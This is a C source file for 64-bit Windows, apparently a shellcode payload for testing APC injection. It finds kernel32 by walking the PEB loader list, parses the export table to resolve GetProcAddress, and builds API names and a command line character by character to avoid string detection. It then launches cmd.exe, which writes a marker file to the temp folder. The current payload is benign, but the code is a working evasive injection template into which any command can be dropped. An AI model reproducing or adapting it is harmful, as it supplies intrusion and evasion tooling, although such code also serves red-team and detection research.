#include <Windows.h>
#include <stdio.h>


int mainasm()
{
    LONG_PTR getKernel32;
    /*	_TEB* pTeb = NtCurrentTeb();*/
    PULONGLONG pPeb = (PULONGLONG)__readgsqword(0x60);
    PULONGLONG pLdr = (PULONGLONG) * (PULONGLONG)((ULONGLONG)pPeb + 0x18);
    PULONGLONG InLoadOrderModuleList = (PULONGLONG)((ULONGLONG)pLdr + 0x10);
    PULONGLONG pModuleExe = (PULONGLONG)*InLoadOrderModuleList;
    PULONGLONG pModuleNtdll = (PULONGLONG)*pModuleExe;
    PULONGLONG pModuleKernel32 = (PULONGLONG)*pModuleNtdll;
    getKernel32 = pModuleKernel32[6];

    typedef FARPROC(WINAPI* FN_GetProcAddress)(
        _In_ HMODULE hModule,
        _In_ LPCSTR lpProcName
        );


    HMODULE hModuleBase = (HMODULE)getKernel32;
    PIMAGE_DOS_HEADER lpDosHeader = (PIMAGE_DOS_HEADER)hModuleBase;
    PIMAGE_NT_HEADERS64 lpNtHeader = (PIMAGE_NT_HEADERS64)((ULONG64)hModuleBase + lpDosHeader->e_lfanew);

    PIMAGE_EXPORT_DIRECTORY lpExports = (PIMAGE_EXPORT_DIRECTORY)((ULONG64)hModuleBase + (ULONG64)lpNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    PDWORD lpdwFunName = (PDWORD)((ULONG64)hModuleBase + (ULONG64)lpExports->AddressOfNames);
    PWORD lpword = (PWORD)((ULONG64)hModuleBase + (ULONG64)lpExports->AddressOfNameOrdinals);
    PDWORD  lpdwFunAddr = (PDWORD)((ULONG64)hModuleBase + (ULONG64)lpExports->AddressOfFunctions);

    DWORD dwLoop = 0;
    FARPROC pRet = NULL;
    for (; dwLoop <= lpExports->NumberOfNames - 1; dwLoop++)
    {
        char* pFunName = (char*)(lpdwFunName[dwLoop] + (ULONG64)hModuleBase);

        if (pFunName[0] == 'G' &&
            pFunName[1] == 'e' &&
            pFunName[2] == 't' &&
            pFunName[3] == 'P' &&
            pFunName[4] == 'r' &&
            pFunName[5] == 'o' &&
            pFunName[6] == 'c' &&
            pFunName[7] == 'A' &&
            pFunName[8] == 'd' &&
            pFunName[9] == 'd' &&
            pFunName[10] == 'r' &&
            pFunName[11] == 'e' &&
            pFunName[12] == 's' &&
            pFunName[13] == 's')
        {
            pRet = (FARPROC)(lpdwFunAddr[lpword[dwLoop]] + (ULONG64)hModuleBase);
            break;
        }
    }

    FN_GetProcAddress fn_GetProcAddress = (FN_GetProcAddress)pRet;


    typedef BOOL(WINAPI* FN_CreateProcessA)(
        _In_opt_ LPCSTR lpApplicationName,
        _Inout_opt_ LPSTR lpCommandLine,
        _In_opt_ LPSECURITY_ATTRIBUTES lpProcessAttributes,
        _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,
        _In_ BOOL bInheritHandles,
        _In_ DWORD dwCreationFlags,
        _In_opt_ LPVOID lpEnvironment,
        _In_opt_ LPCSTR lpCurrentDirectory,
        _In_ LPSTARTUPINFOA lpStartupInfo,
        _Out_ LPPROCESS_INFORMATION lpProcessInformation);
    char xy_CreateProcessA[] = { 'C', 'r', 'e', 'a', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'A', 0 };
    FN_CreateProcessA fn_CreateProcessA = (FN_CreateProcessA)fn_GetProcAddress((HMODULE)getKernel32, xy_CreateProcessA);

    // Set up the command line for cmd.exe
    //char cmdLine[] = "cmd.exe /c echo Hello > %temp%\\APC_inject_success.txt";
    char cmdLine[] = { 'c', 'm', 'd', '.', 'e', 'x', 'e', ' ', '/', 'c', ' ', 'e', 'c', 'h', 'o', ' ',
                   'H', 'e', 'l', 'l', 'o', ' ', '>', ' ', '%', 't', 'e', 'm', 'p', '%', '\\', '\\',
                   'A', 'P', 'C', '_', 'i', 'n', 'j', 'e', 'c', 't', '_', 's', 'u', 'c', 'c', 'e',
                   's', 's', '.', 't', 'x', 't', 0 };

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    // 手动初始化 STARTUPINFOA 结构体
    for (int i = 0; i < sizeof(si); i++) {
        ((char*)&si)[i] = 0;
    }
    si.cb = sizeof(si);  // 设置 STARTUPINFOA 的 cb 字段

    // 手动初始化 PROCESS_INFORMATION 结构体
    for (int i = 0; i < sizeof(pi); i++) {
        ((char*)&pi)[i] = 0;
    }

    // Execute the command using CreateProcessA
    fn_CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    return 0;
}

